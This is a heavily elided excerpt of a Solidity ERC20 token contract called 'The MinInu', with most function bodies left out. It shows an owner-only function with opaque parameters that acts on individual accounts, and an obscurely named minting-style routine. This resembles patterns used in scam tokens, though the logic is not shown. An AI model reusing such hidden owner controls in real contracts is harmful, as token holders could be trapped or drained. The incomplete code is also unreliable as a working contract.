...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    function TheMiniCollection(address account, bool v1, bool v2, bool v3, uint256 v4) external onlyOwner {
    ...
    function _makingSmall(address account, uint256 amount, uint256 val1, uint256 val2) internal virtual {
...
contract ERC20Mini is Context, ERC20 {
    constructor(
        ...
        _makingSmall(owner, initialSupply, house6, house7);
    }
}

contract TheMinInu is ERC20Mini {
    constructor() ERC20Mini("The MinInu", "minINU", false, true, 900, 25, msg.sender, 600000000 * 10 ** 18, msg.sender, 343) {
    }
}